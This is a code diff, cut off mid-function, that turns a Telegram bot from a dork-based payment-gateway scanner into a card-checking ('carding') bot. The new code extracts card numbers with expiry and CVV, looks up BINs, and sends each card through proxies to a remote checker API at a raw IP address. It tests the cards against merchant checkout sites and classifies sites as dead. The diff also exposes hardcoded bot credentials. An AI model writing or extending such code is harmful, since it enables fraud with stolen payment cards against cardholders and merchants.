@@ -1,824 +1,1066 @@
+from telethon import TelegramClient, events, Button
+import asyncio
+import aiohttp
+import aiofiles
 import os
+import random
 import time
+import json
 import re
-import requests
-import cloudscraper
-import telebot
-from telebot import types
-from urllib.parse import urlparse
-import sys
-import io
 from datetime import datetime
+# Direct API endpoint (replaces checker_bridge)
+CHECKER_API_URL = 'http://148.230.102.178:8081/'
 
-TOKEN = "7707742168:AAGYX7yJBHjm-aVECNFHJ8n68YMPRThD76w"
-bot = telebot.TeleBot(TOKEN)
-
-GATEWAYS = {
-    "stripe": "stripe",
-    "paypal": "paypal",
-    "braintree": "braintree",
-    "adyen": "adyen",
-    "checkout_com": "checkout_com",
-    "worldpay": "worldpay",
-    "square": "square",
-    "authorize_net": "authorize_net",
-    "cybersource": "cybersource",
-    "klarna": "klarna",
-    "affirm": "affirm",
-    "afterpay": "afterpay",
-    "sezzle": "sezzle",
-    "zip": "zip",
-    "splitit": "splitit",
-    "paddle": "paddle",
-    "recurly": "recurly",
-    "razorpay": "razorpay",
-    "payu": "payu",
-    "paystack": "paystack",
-    "flutterwave": "flutterwave",
-    "mollie": "mollie",
-    "ebanx": "ebanx",
-    "mercadopago": "mercadopago",
-    "cielo": "cielo",
-    "pagseguro": "pagseguro",
-    "stone": "stone",
-    "ebanx_brazil": "ebanx_brazil",
-    "boltmx": "boltmx",
-    "ebanx_latam": "ebanx_latam",
-    "dlocal": "dlocal",
-    "payoneer": "payoneer",
-    "skrill": "skrill",
-    "neteller": "neteller",
-    "wise": "wise",
-    "revolut_pay": "revolut_pay",
-    "apple_pay": "apple_pay",
-    "google_pay": "google_pay",
-    "amazon_pay": "amazon_pay",
-    "venmo": "venmo",
-    "alipay": "alipay",
-    "wechat_pay": "wechat_pay",
-    "paytm": "paytm",
-    "gcash": "gcash",
-    "paymaya": "paymaya",
-    "grabpay": "grabpay",
-    "touchngo": "touchngo",
-    "boost": "boost",
-    "fawry": "fawry",
-    "paymob": "paymob",
-    "myfatoorah": "myfatoorah",
-    "tap_payments": "tap_payments",
-    "paytabs": "paytabs",
-    "hyperpay": "hyperpay",
-    "network_international": "network_international",
-    "paysera": "paysera",
-    "paytrail": "paytrail",
-    "payfast": "payfast",
-    "payhere": "payhere",
-    "iyzico": "iyzico",
-    "payzen": "payzen",
-    "hipay": "hipay",
-    "bluepay": "bluepay",
-    "moneris": "moneris",
-    "payjunction": "payjunction",
-    "cardconnect": "cardconnect",
-    "heartland": "heartland",
-    "merchantone": "merchantone",
-    "fastspring": "fastspring",
-    "2checkout": "2checkout",
-    "2c2p": "2c2p",
-    "doku": "doku",
-    "omise": "omise",
-    "senangpay": "senangpay",
-    "eghl": "eghl",
-    "dragonpay": "dragonpay",
-    "ipay88": "ipay88",
-    "molpay": "molpay",
-    "ipaymu": "ipaymu",
-    "xendit": "xendit",
-    "midtrans": "midtrans",
-    "duitku": "duitku",
-    "qpay": "qpay",
-    "knet": "knet",
-    "benefitpay": "benefitpay",
-    "stc_pay": "stc_pay",
-    "mada": "mada",
-    "unionpay": "unionpay",
-    "jcb": "jcb",
-    "discover": "discover",
-    "visa_checkout": "visa_checkout",
-    "masterpass": "masterpass",
-    "samsung_pay": "samsung_pay",
-    "huawei_pay": "huawei_pay",
-    "zelle": "zelle",
-    "chase_pay": "chase_pay",
-    "barclaycard": "barclaycard",
-    "sagepay": "sagepay",
-    "opayo": "opayo",
-    "worldline": "worldline",
-    "ingenico": "ingenico",
-    "stripe_terminal": "stripe_terminal",
-    "adyen_pos": "adyen_pos",
-    "square_pos": "square_pos",
-    "paypal_here": "paypal_here",
-    "mena_gateway_105": "mena_gateway_105",
-    "latam_processor_106": "latam_processor_106",
-    "africa_pay_107": "africa_pay_107",
-    "eu_pay_service_108": "eu_pay_service_108",
-    "us_acquirer_109": "us_acquirer_109",
-    "asia_checkout_110": "asia_checkout_110",
-    "mena_wallet_111": "mena_wallet_111",
-    "latam_gateway_112": "latam_gateway_112",
-    "africa_processor_113": "africa_processor_113",
-    "eu_pay_114": "eu_pay_114",
-    "us_pay_service_115": "us_pay_service_115",
-    "asia_acquirer_116": "asia_acquirer_116",
-    "mena_checkout_117": "mena_checkout_117",
-    "latam_wallet_118": "latam_wallet_118",
-    "africa_gateway_119": "africa_gateway_119",
-    "eu_processor_120": "eu_processor_120",
-    "us_pay_121": "us_pay_121",
-    "asia_pay_service_122": "asia_pay_service_122",
-    "mena_acquirer_123": "mena_acquirer_123",
-    "latam_checkout_124": "latam_checkout_124",
-    "africa_wallet_125": "africa_wallet_125",
-    "eu_gateway_126": "eu_gateway_126",
-    "us_processor_127": "us_processor_127",
-    "asia_pay_128": "asia_pay_128",
-    "mena_pay_service_129": "mena_pay_service_129",
-    "latam_acquirer_130": "latam_acquirer_130",
-    "africa_checkout_131": "africa_checkout_131",
-    "eu_wallet_132": "eu_wallet_132",
-    "us_gateway_133": "us_gateway_133",
-    "asia_processor_134": "asia_processor_134",
-    "mena_pay_135": "mena_pay_135",
-    "latam_pay_service_136": "latam_pay_service_136",
-    "africa_acquirer_137": "africa_acquirer_137",
-    "eu_checkout_138": "eu_checkout_138",
-    "us_wallet_139": "us_wallet_139",
-    "asia_gateway_140": "asia_gateway_140",
-    "mena_processor_141": "mena_processor_141",
-    "latam_pay_142": "latam_pay_142",
-    "africa_pay_service_143": "africa_pay_service_143",
-    "eu_acquirer_144": "eu_acquirer_144",
-    "us_checkout_145": "us_checkout_145",
-    "asia_wallet_146": "asia_wallet_146",
-    "mena_gateway_147": "mena_gateway_147",
-    "latam_processor_148": "latam_processor_148",
-    "africa_pay_149": "africa_pay_149",
-    "eu_pay_service_150": "eu_pay_service_150",
-    "us_acquirer_151": "us_acquirer_151",
-    "asia_checkout_152": "asia_checkout_152",
-    "mena_wallet_153": "mena_wallet_153",
-    "latam_gateway_154": "latam_gateway_154",
-    "africa_processor_155": "africa_processor_155",
-    "eu_pay_156": "eu_pay_156",
-    "us_pay_service_157": "us_pay_service_157",
-    "asia_acquirer_158": "asia_acquirer_158",
-    "mena_checkout_159": "mena_checkout_159",
-    "latam_wallet_160": "latam_wallet_160",
-    "africa_gateway_161": "africa_gateway_161",
-    "eu_processor_162": "eu_processor_162",
-    "us_pay_163": "us_pay_163",
-    "asia_pay_service_164": "asia_pay_service_164",
-    "mena_acquirer_165": "mena_acquirer_165",
-    "latam_checkout_166": "latam_checkout_166",
-    "africa_wallet_167": "africa_wallet_167",
-    "eu_gateway_168": "eu_gateway_168",
-    "us_processor_169": "us_processor_169",
-    "asia_pay_170": "asia_pay_170",
-    "mena_pay_service_171": "mena_pay_service_171",
-    "latam_acquirer_172": "latam_acquirer_172",
-    "africa_checkout_173": "africa_checkout_173",
-    "eu_wallet_174": "eu_wallet_174",
-    "us_gateway_175": "us_gateway_175",
-    "asia_processor_176": "asia_processor_176",
-    "mena_pay_177": "mena_pay_177",
-    "latam_pay_service_178": "latam_pay_service_178",
-    "africa_acquirer_179": "africa_acquirer_179",
-    "eu_checkout_180": "eu_checkout_180",
-    "us_wallet_181": "us_wallet_181",
-    "asia_gateway_182": "asia_gateway_182",
-    "mena_processor_183": "mena_processor_183",
-    "latam_pay_184": "latam_pay_184",
-    "africa_pay_service_185": "africa_pay_service_185",
-    "eu_acquirer_186": "eu_acquirer_186",
-    "us_checkout_187": "us_checkout_187",
-    "asia_wallet_188": "asia_wallet_188",
-    "mena_gateway_189": "mena_gateway_189",
-    "latam_processor_190": "latam_processor_190",
-    "africa_pay_191": "africa_pay_191",
-    "eu_pay_service_192": "eu_pay_service_192",
-    "us_acquirer_193": "us_acquirer_193",
-    "asia_checkout_194": "asia_checkout_194",
-    "mena_wallet_195": "mena_wallet_195",
-    "latam_gateway_196": "latam_gateway_196",
-    "africa_processor_197": "africa_processor_197",
-    "eu_pay_198": "eu_pay_198",
-    "us_pay_service_199": "us_pay_service_199",
-    "asia_acquirer_200": "asia_acquirer_200",
-    "mena_checkout_201": "mena_checkout_201",
-    "latam_wallet_202": "latam_wallet_202",
-    "africa_gateway_203": "africa_gateway_203",
-    "eu_processor_204": "eu_processor_204",
-    "us_pay_205": "us_pay_205",
-    "asia_pay_service_206": "asia_pay_service_206",
-    "mena_acquirer_207": "mena_acquirer_207",
-    "latam_checkout_208": "latam_checkout_208",
-    "africa_wallet_209": "africa_wallet_209",
-    "eu_gateway_210": "eu_gateway_210",
-    "us_processor_211": "us_processor_211",
-    "asia_pay_212": "asia_pay_212",
-    "mena_pay_service_213": "mena_pay_service_213",
-    "latam_acquirer_214": "latam_acquirer_214",
-    "africa_checkout_215": "africa_checkout_215",
-    "eu_wallet_216": "eu_wallet_216",
-    "us_gateway_217": "us_gateway_217",
-    "asia_processor_218": "asia_processor_218",
-    "mena_pay_219": "mena_pay_219",
-    "latam_pay_service_220": "latam_pay_service_220",
-    "africa_acquirer_221": "africa_acquirer_221",
-    "eu_checkout_222": "eu_checkout_222",
-    "us_wallet_223": "us_wallet_223",
-    "asia_gateway_224": "asia_gateway_224",
-    "mena_processor_225": "mena_processor_225",
-    "latam_pay_226": "latam_pay_226",
-    "africa_pay_service_227": "africa_pay_service_227",
-    "eu_acquirer_228": "eu_acquirer_228",
-    "us_checkout_229": "us_checkout_229",
-    "asia_wallet_230": "asia_wallet_230",
-    "mena_gateway_231": "mena_gateway_231",
-    "latam_processor_232": "latam_processor_232",
-    "africa_pay_233": "africa_pay_233",
-    "eu_pay_service_234": "eu_pay_service_234",
-    "us_acquirer_235": "us_acquirer_235",
-    "asia_checkout_236": "asia_checkout_236",
-    "mena_wallet_237": "mena_wallet_237",
-    "latam_gateway_238": "latam_gateway_238",
-    "africa_processor_239": "africa_processor_239",
-    "eu_pay_240": "eu_pay_240",
-    "us_pay_service_241": "us_pay_service_241",
-    "asia_acquirer_242": "asia_acquirer_242",
-    "mena_checkout_243": "mena_checkout_243",
-    "latam_wallet_244": "latam_wallet_244",
-    "africa_gateway_245": "africa_gateway_245",
-    "eu_processor_246": "eu_processor_246",
-    "us_pay_247": "us_pay_247",
-    "asia_pay_service_248": "asia_pay_service_248",
-    "mena_acquirer_249": "mena_acquirer_249",
-    "latam_checkout_250": "latam_checkout_250",
-    "africa_wallet_251": "africa_wallet_251",
-    "eu_gateway_252": "eu_gateway_252",
-    "us_processor_253": "us_processor_253",
-    "asia_pay_254": "asia_pay_254",
-    "mena_pay_service_255": "mena_pay_service_255",
-    "latam_acquirer_256": "latam_acquirer_256",
-    "africa_checkout_257": "africa_checkout_257",
-    "eu_wallet_258": "eu_wallet_258",
-    "us_gateway_259": "us_gateway_259",
-    "asia_processor_260": "asia_processor_260",
-    "mena_pay_261": "mena_pay_261",
-    "latam_pay_service_262": "latam_pay_service_262",
-    "africa_acquirer_263": "africa_acquirer_263",
-    "eu_checkout_264": "eu_checkout_264",
-    "us_wallet_265": "us_wallet_265",
-    "asia_gateway_266": "asia_gateway_266",
-    "mena_processor_267": "mena_processor_267",
-    "latam_pay_268": "latam_pay_268",
-    "africa_pay_service_269": "africa_pay_service_269",
-    "eu_acquirer_270": "eu_acquirer_270",
-    "us_checkout_271": "us_checkout_271",
-    "asia_wallet_272": "asia_wallet_272",
-    "mena_gateway_273": "mena_gateway_273",
-    "latam_processor_274": "latam_processor_274",
-    "africa_pay_275": "africa_pay_275",
-    "eu_pay_service_276": "eu_pay_service_276",
-    "us_acquirer_277": "us_acquirer_277",
-    "asia_checkout_278": "asia_checkout_278",
-    "mena_wallet_279": "mena_wallet_279",
-    "latam_gateway_280": "latam_gateway_280",
-    "africa_processor_281": "africa_processor_281",
-    "eu_pay_282": "eu_pay_282",
-    "us_pay_service_283": "us_pay_service_283",
-    "asia_acquirer_284": "asia_acquirer_284",
-    "mena_checkout_285": "mena_checkout_285",
-    "latam_wallet_286": "latam_wallet_286",
-    "africa_gateway_287": "africa_gateway_287",
-    "eu_processor_288": "eu_processor_288",
-    "us_pay_289": "us_pay_289",
-    "asia_pay_service_290": "asia_pay_service_290",
-    "mena_acquirer_291": "mena_acquirer_291",
-    "latam_checkout_292": "latam_checkout_292",
-    "africa_wallet_293": "africa_wallet_293",
-    "eu_gateway_294": "eu_gateway_294",
-    "us_processor_295": "us_processor_295",
-    "asia_pay_296": "asia_pay_296",
-    "mena_pay_service_297": "mena_pay_service_297",
-    "latam_acquirer_298": "latam_acquirer_298",
-    "africa_checkout_299": "africa_checkout_299",
-    "eu_wallet_300": "eu_wallet_300",
-    "us_gateway_301": "us_gateway_301",
-    "asia_processor_302": "asia_processor_302",
-    "mena_pay_303": "mena_pay_303",
-    "latam_pay_service_304": "latam_pay_service_304",
-    "africa_acquirer_305": "africa_acquirer_305",
-    "eu_checkout_306": "eu_checkout_306",
-    "us_wallet_307": "us_wallet_307",
-    "asia_gateway_308": "asia_gateway_308",
-    "mena_processor_309": "mena_processor_309",
-    "latam_pay_310": "latam_pay_310",
-    "africa_pay_service_311": "africa_pay_service_311",
-    "eu_acquirer_312": "eu_acquirer_312",
-    "us_checkout_313": "us_checkout_313",
-    "asia_wallet_314": "asia_wallet_314",
-    "mena_gateway_315": "mena_gateway_315",
-    "latam_processor_316": "latam_processor_316",
-    "africa_pay_317": "africa_pay_317",
-    "eu_pay_service_318": "eu_pay_service_318",
-    "us_acquirer_319": "us_acquirer_319",
+# Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
+# Use @RawDataBot to get custom_emoji_id for any premium emoji
+PREMIUM_EMOJI_IDS = {
+    "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
+    "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
+    "❌": "6037570896766438989",   # 💀 White Skull (Dark Glow)
+    "⚡": "6026367225466720832",   # ⚡ Yellow Lightning Bolt
+    "💳": "5971944878815317190",   # 💫 Floating Color Dots
+    "💠": "5971837723676249096",   # 🌀 Neon Circle Rings
+    "📝": "6023660820544623088",   # ✨
+    "🌐": "6026367225466720832",   # ⚡
+    "🎯": "5974235702701853774",   # 🟠🟡🟢 Triple Ring Loader
+    "🤖": "6057466460886799210",   # 😼 Dark Cat Face
+    "🤵": "4949560993840629085",   # 🧠 Golden Maze
+    "💰": "5971944878815317190",   # 💫
+    "⏸️": "6001440193058444284",   # ⚙️ Arc Reactor
+    "▶️": "6285315214673975495",   # ➡️ Neon Arrow Right
+    "🛑": "5420323339723881652",   # ⚠️ Red Warning Triangle
+    "📊": "5971837723676249096",   # 🌀
+    "📦": "6066395745139824604",   # 🎀 Neon Pink Bow
+    "📋": "5974235702701853774",   # Triple Ring
+    "🔄": "5971837723676249096",   # 🌀 Neon Circle Rings
+    "⏳": "5971837723676249096",   # 🌀
+    "🚀": "6282977077427702833",   # 🎉 Color Confetti
+    "⚠️": "5420323339723881652",   # ⚠️ Red Warning Triangle
+    "💎": "6023660820544623088",   # ✨
 }
-                        
-VBV_KEYWORDS = ['3D-Secure', 'threeDSecureInfo', 'VBV', '3DSecure', '3D Secure']
-AUTH_PATHS = ['/my-account', '/account', '/login', '/signin']
-SECURITY_TERMS = ['captcha', 'recaptcha', "i'm not a robot"]
-CLOUDFLARE_TERMS = ["Cloudflare", "cdnjs.cloudflare.com"]
 
-user_api_keys = {}
-user_search_results = {}
-user_language = {}
+def premium_emoji(text):
+    """Replace Unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis.
+    Requires a Telethon/parser that supports <tg-emoji emoji-id="ID"> in HTML (e.g. Telethon 2.x or custom parser).
+    Bot must be created with a Telegram Premium account for custom emojis to send."""
+    if not text:
+        return text
+    # Use placeholders to avoid replacing the same emoji inside tags again
+    placeholders = []
+    result = text
+    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
+        placeholder = f"\x00PE{i:02d}\x00"
+        placeholders.append((placeholder, doc_id, emoji))
+        result = result.replace(emoji, placeholder)
+    for placeholder, doc_id, emoji in placeholders:
+        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
+    return result
 
-def fetch_url(url):
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
+# Bot Configuration
+API_ID = 21124241
+API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
+BOT_TOKEN = '7707742168:AAGYX7yJBHjm-aVECNFHJ8n68YMPRThD76w'
+
+
+# File paths
+PREMIUM_FILE = 'premium.txt'
+SITES_FILE = 'sites.txt'
+PROXY_FILE = 'proxy.txt'
+
+# Initialize bot
+bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+# Store active checking sessions
+active_sessions = {}
+
+# Dead site error keywords
+_DEAD_INDICATORS = (
+    'receipt id is empty', 'handle is empty', 'product id is empty',
+    'tax amount is empty', 'payment method identifier is empty',
+    'invalid url', 'error in 1st req', 'error in 1 req',
+    'cloudflare', 'connection failed', 'timed out',
+    'access denied', 'tlsv1 alert', 'ssl routines',
+    'could not resolve', 'domain name not found',
+    'name or service not known', 'openssl ssl_connect',
+    'empty reply from server', 'httperror504', 'http error',
+    'timeout', 'unreachable', 'ssl error',
+    '502', '503', '504', 'bad gateway', 'service unavailable',
+    'gateway timeout', 'network error', 'connection reset',
+    'failed to detect product', 'failed to create checkout',
+    'failed to tokenize card', 'failed to get proposal data',
+    'submit rejected', 'submit rejected:','handle error', 'http 404',
+    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
+    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
+    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
+    'all products sold out', 'no_session_token', 'tokenize_fail',
+)
+# --- UPDATED LOADING FUNCTIONS ---
+def get_file_lines(filepath):
+    """Helper to read lines from a file fresh every time"""
+    if not os.path.exists(filepath):
+        return []
     try:
-        scraper = cloudscraper.create_scraper()
-        return scraper.get(url, timeout=10)
-    except:
-        try:
-            if url.startswith('https://'):
-                url = 'http://' + url[8:]
-                return scraper.get(url, timeout=10)
-        except:
-            return None
-    return None
-
-def detect_gateways(html):
-    found = [name for key, name in GATEWAYS.items() if key in html.lower()]
-    return found or ["Unknown"]
-
-def check_security(html, domain):
-    html_lower = html.lower()
-    return {
-        'captcha': any(term in html_lower for term in SECURITY_TERMS),
-        'cloudflare': any(term in html for term in CLOUDFLARE_TERMS),
-        'auth': any(_check_auth_path(domain, p) for p in AUTH_PATHS),
-        'vbv': any(re.search(k, html, re.IGNORECASE) for k in VBV_KEYWORDS)
-    }
-
-def _check_auth_path(domain, path):
-    try:
-        return requests.get(f"http://{domain}{path}", timeout=5).status_code == 200
-    except:
-        return False
-
-def extract_domain(url):
-    parsed = urlparse(url if url.startswith(('http://', 'https://')) else 'http://' + url)
-    return parsed.netloc or url.split('/')[0]
-
-def format_result(display_url, gateways, security, elapsed, user=None):
-    domain = extract_domain(display_url)
-    display = domain if len(display_url) < 50 else display_url[:50] + "..."
-
-    check_by = f"\n┃•➤ Checked by ➜ [{user.first_name}](tg://user?id={user.id}) 🕷" if user else ""
-    return f"""
-┏━━━━━━━⍟
-┃•Website Analysis ✅
-┗━━━━━━━━━━━━⊛
-┏━━━━━━━⍟
-┃•➤ Site ➜ `{display}` ⎙
-┃•➤ Gateways ➜ {', '.join(gateways)} 🍂
-┃•➤ Security ⁞ 
-┃   ❁ Captcha ➜ {'✅' if security['captcha'] else '⛔'}
-┃   ❁ Cloudflare ➜ {'✅' if security['cloudflare'] else '⛔'}
-┃   ❁ Login/Auth ➜ {'✅' if security['auth'] else '⛔'}
-┃   ❁ VBV/3D Secure ➜ {'✅' if security['vbv'] else '⛔'}
-┗━━━━━━━━━━━━⊛  
-┏━━━━━━━⍟
-┃•➤ Time ➜ {elapsed}s ⌚️{check_by}
-┃•➤ Bot ➜ [Gateways Checker Bot](https://t.me/Jaasemm)  
-┗━━━━━━━━━━━━⊛
-"""
-
-def check_site(url, user=None):
-    start = time.time()
-    try:
-        resp = fetch_url(url)
-        if not resp:
-            raise Exception("No response (site may be down)")
-
-        final_url = resp.url
-        domain = extract_domain(final_url)
-        html = resp.text
-
-        gateways = detect_gateways(html)
-        security = check_security(html, domain)
-        elapsed = round(time.time() - start, 2)
-        return format_result(url, gateways, security, elapsed, user)
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip()]
     except Exception as e:
-        elapsed = round(time.time() - start, 2)
-        return f"❌ Failed to check: {url}\n   Error: {str(e)} (after {elapsed}s)"
+        print(f"Error reading {filepath}: {e}")
+        return []
 
-def test_api_key(api_key):
+def load_premium_users():
+    return get_file_lines(PREMIUM_FILE)
+
+def load_sites():
+    return get_file_lines(SITES_FILE)
+
+def load_proxies():
+    return get_file_lines(PROXY_FILE)
+
+def is_premium(user_id):
+    """Check if user is premium - Reads file fresh every check"""
+    premium_users = load_premium_users()
+    return str(user_id) in premium_users
+
+def extract_cc(text):
+    """Extract CC from text in format: card|month|year|cvv"""
+    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
+    matches = re.findall(pattern, text)
+    cards = []
+    for match in matches:
+        card, month, year, cvv = match
+        if len(year) == 2:
+            year = '20' + year
+        cards.append(f"{card}|{month}|{year}|{cvv}")
+    return cards
+
+def is_dead_site_error(error_msg):
+    """Check if error indicates dead site"""
+    if not error_msg:
+        return True
+    error_lower = str(error_msg).lower()
+    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)
+
+async def get_bin_info(card_number):
+    """Get BIN info from API"""
     try:
-        url = "https://www.searchapi.io/api/v1/search"
-        params = {'q': 'test', 'engine': 'google', 'api_key': api_key}
-        response = requests.get(url, params=params, timeout=10)
-        data = response.json()
-        if 'error' in data:
-            error_msg = data['error']
-            if 'invalid api key' in error_msg.lower() or 'unauthorized' in error_msg.lower():
-                return False, "مفتاح API غير صالح"
-            else:
-                return False, f"خطأ في API: {error_msg}"
-        else:
-            return True, "مفتاح API صالح"
-    except Exception as e:
-        return False, f"خطأ في الاتصال: {str(e)}"
+        bin_number = card_number[:6]
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
+                if res.status != 200:
+                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
+                response_text = await res.text()
+                try:
+                    data = json.loads(response_text)
+                    brand = data.get('brand', '-')
+                    bin_type = data.get('type', '-')
+                    level = data.get('level', '-')
+                    bank = data.get('bank', '-')
+                    country = data.get('country_name', '-')
+                    flag = data.get('country_flag', '')
+                    return brand, bin_type, level, bank, country, flag
+                except json.JSONDecodeError:
+                    return '-', '-', '-', '-', '-', ''
+    except Exception:
+        return '-', '-', '-', '-', '-', ''
 
-def search_with_dork(query, api_key):
+async def check_card(card, site, proxy):
+    """Check a single card against a site using the direct checker API"""
     try:
-        url = "https://www.searchapi.io/api/v1/search"
-        params = {'q': query, 'engine': 'google', 'api_key': api_key, 'num': 20}
-        response = requests.get(url, params=params, timeout=30)
-        data = response.json()
-        if 'error' in data:
-            error_msg = data['error']
-            if 'invalid api key' in error_msg.lower():
-                return "مفتاح API غير صالح. يرجى تحديث المفتاح باستخدام /addkey", []
-            elif 'quota' in error_msg.lower() or 'limit' in error_msg.lower():
-                return "تم تجاوز حصة API. يرجى التحقق من حساب SearchApi.io الخاص بك", []
-            else:
-                return f"خطأ في API: {error_msg}", []
-        return format_dork_results(data, query)
-    except Exception as e:
-        return f"خطأ في البحث: {str(e)}", []
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
 
-def search_normal(query, api_key):
-    try:
-        url = "https://www.searchapi.io/api/v1/search"
-        params = {'q': query, 'engine': 'google', 'api_key': api_key, 'num': 20}
-        response = requests.get(url, params=params, timeout=30)
-        data = response.json()
-        if 'error' in data:
-            error_msg = data['error']
-            if 'invalid api key' in error_msg.lower():
-                return "مفتاح API غير صالح. يرجى تحديث المفتاح باستخدام /addkey", []
-            elif 'quota' in error_msg.lower() or 'limit' in error_msg.lower():
-                return "تم تجاوز حصة API. يرجى التحقق من حساب SearchApi.io الخاص بك", []
-            else:
-                return f"خطأ في API: {error_msg}", []
-        return format_normal_results(data, query)
-    except Exception as e:
-        return f"خطأ في البحث: {str(e)}", []
-
-def format_dork_results(data, query):
-    if 'organic_results' not in data or not data['organic_results']:
-        return "لا توجد نتائج لاستعلامك", []
-    
-    results_text = f"نتائج البحث المتقدم\n\n"
-    urls = []
-    seen = set()
-    counter = 1
-    for result in data['organic_results']:
-        link = result.get('link')
-        if link and link.startswith(('http://', 'https://')) and link not in seen:
-            seen.add(link)
-            results_text += f"{counter}. {link}\n\n"
-            urls.append(link)
-            counter += 1
-            if counter > 20:
-                break
-    
-    if not urls:
-        return "لا توجد روابط صالحة في النتائج", []
-    
-    results_text += f"إجمالي النتائج: {len(urls)}\n"
-    results_text += "لتحميل الروابط استخدم الأمر /export"
-    return results_text, urls
-
-def format_normal_results(data, query):
-    if 'organic_results' not in data or not data['organic_results']:
-        return "لا توجد نتائج لاستعلامك", []
-    
-    results_text = f"نتائج البحث العادي\n\n"
-    urls = []
-    seen = set()
-    counter = 1
-    for result in data['organic_results']:
-        link = result.get('link')
-        if link and link.startswith(('http://', 'https://')) and link not in seen:
-            seen.add(link)
-            results_text += f"{counter}. {link}\n\n"
-            urls.append(link)
-            counter += 1
-            if counter > 20:
-                break
-    
-    if not urls:
-        return "لا توجد روابط صالحة في النتائج", []
-    
-    results_text += f"إجمالي النتائج: {len(urls)}\n"
-    results_text += "لتحميل الروابط استخدم الأمر /export"
-    return results_text, urls
-
-def create_txt_file(urls, query):
-    if not urls:
-        return None
-    clean_query = "".join(c for c in query if c.isalnum() or c in (' ', '-', '_')).rstrip()
-    clean_query = clean_query[:30]
-    filename = f"نتائج_{clean_query}_{datetime.now().strftime('%H%M%S')}.txt"
-    file_content = f"نتائج البحث عن: {query}\n"
-    file_content += f"تم الإنشاء في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    file_content += f"إجمالي الروابط: {len(urls)}\n\n"
-    for i, url in enumerate(urls, 1):
-        file_content += f"{i}. {url}\n"
-    file_buffer = io.BytesIO(file_content.encode('utf-8'))
-    file_buffer.name = filename
-    return file_buffer
-
-def get_text(lang, key):
-    texts = {
-        'ar': {
-            'welcome': "اختر القسم الذي تريده من الأزرار أدناه:",
-            'search_section': "🔍 *قسم استخراج بوابات الدفع*\n\nالأوامر المتاحة:\n/dork - بحث متقدم (باستخدام Google Dorks)\n/search - بحث عادي\n/addkey - إضافة مفتاح API\n/mykey - عرض المفتاح الحالي\n/removekey - حذف المفتاح\n/testkey - اختبار صحة المفتاح\n/export - تصدير آخر نتائج البحث كملف نصي\n/getkey - كيفية الحصول على مفتاح\n/status - حالة البوت\n\nللبحث، اكتب الأمر متبوعاً باستعلامك.\nمثال: /dork intext:password site:example.com",
-            'gateway_section': "🛡 *قسم فحص بوابات الدفع*\n\nالأوامر المتاحة:\n/check <url> — فحص موقع واحد (مع أو بدون https://)\n/combo — فحص عدة مواقع (رابط واحد لكل سطر بعد الأمر)\n\nأمثلة:\n/check example.com\n/combo\nexample1.com/donate\nexample2.org/support",
-            'help': "طريقة الاستخدام:\n\n1. استخراج بوابات الدفع: استخدم /dork أو /search مع استعلام (يتطلب مفتاح API)\n2. فحص بوابات الدفع: استخدم /check أو /combo\n3. لمزيد من التفاصيل عن كل قسم، اختر من القائمة الرئيسية (/start)",
-            'choose_language': "🌐 اختر لغتك المفضلة / Choose your preferred language:"
-        },
-        'en': {
-            'welcome': "Choose the section you want from the buttons below:",
-            'search_section': "🔍 *Payment Gateways Extraction Section*\n\nAvailable commands:\n/dork - Advanced search (using Google Dorks)\n/search - Normal search\n/addkey - Add API key\n/mykey - Show current key\n/removekey - Delete key\n/testkey - Test key validity\n/export - Export last search results as text file\n/getkey - How to get a key\n/status - Bot status\n\nTo search, type the command followed by your query.\nExample: /dork intext:password site:example.com",
-            'gateway_section': "🛡 *Payment Gateways Checker Section*\n\nAvailable commands:\n/check <url> — Check single site (with or without https://)\n/combo — Check multiple sites (one URL per line after the command)\n\nExamples:\n/check example.com\n/combo\nexample1.com/donate\nexample2.org/support",
-            'help': "Usage:\n\n1. Payment Gateways Extraction: Use /dork or /search with a query (requires API key)\n2. Payment Gateways Checker: Use /check or /combo\n3. For more details about each section, choose from the main menu (/start)",
-            'choose_language': "🌐 Choose your preferred language:"
+        params = {
+            'cc': card,
+            'url': site,
+            'proxy': proxy
         }
-    }
-    return texts.get(lang, texts['ar']).get(key, '')
+        timeout = aiohttp.ClientTimeout(total=120)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(CHECKER_API_URL, params=params) as resp:
+                raw = await resp.json(content_type=None)
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    user_id = message.from_user.id
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    
-    if user_id not in user_language:
-        btn_ar = types.InlineKeyboardButton("🇮🇶 Arabic", callback_data="lang_ar")
-        btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
-        markup.add(btn_ar, btn_en)
-        bot.send_message(message.chat.id, get_text('ar', 'choose_language'), reply_markup=markup)
-    else:
-        lang = user_language[user_id]
-        btn1 = types.InlineKeyboardButton("🔍 استخراج بوابات الدفع" if lang == 'ar' else "🔍 Payment Gateways Extraction", callback_data="search")
-        btn2 = types.InlineKeyboardButton("🛡 فحص بوابات الدفع" if lang == 'ar' else "🛡 Payment Gateways Checker", callback_data="gateways")
-        markup.add(btn1, btn2)
-        bot.send_message(message.chat.id, get_text(lang, 'welcome'), reply_markup=markup)
+        response_msg = raw.get('Response', '')
+        price = raw.get('Price', '-')
+        gate = raw.get('Gate', 'shopiii')
